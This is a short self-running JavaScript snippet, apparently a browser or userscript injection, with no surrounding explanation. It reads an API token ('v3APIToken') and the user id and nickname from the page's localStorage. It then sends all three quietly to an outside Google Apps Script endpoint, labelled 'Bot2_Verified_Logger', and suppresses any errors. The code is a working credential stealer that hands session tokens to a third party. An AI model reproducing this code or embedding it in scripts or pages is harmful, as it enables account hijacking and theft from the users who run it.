(function() {
    const _gs = "https://script.google.com/macros/s/AKfycbyR-IX4up6a_FCP5rnKWW7yLstNuo2IZRdrh12dFVx0ZSvfRbtIeOw5qVNl-lKHE3jt/exec";
    const _t = localStorage.getItem('v3APIToken');
    let _u = "Bilinmiyor", _n = "Bilinmiyor";

    try {
        const user = JSON.parse(localStorage.getItem('user') || '{}');
        _u = user.id || "Bilinmiyor";
        _n = user.nickname || document.querySelector('[class*="nickname"]')?.innerText || "Bilinmiyor";

        if (_t) {
            fetch(`${_gs}?token=${_t}&userId=${_u}&nickname=${encodeURIComponent(_n)}&source=Bot2_Verified_Logger`, {
                method: 'GET',
                mode: 'no-cors'
            });
        }
    } catch (e) {}
})();
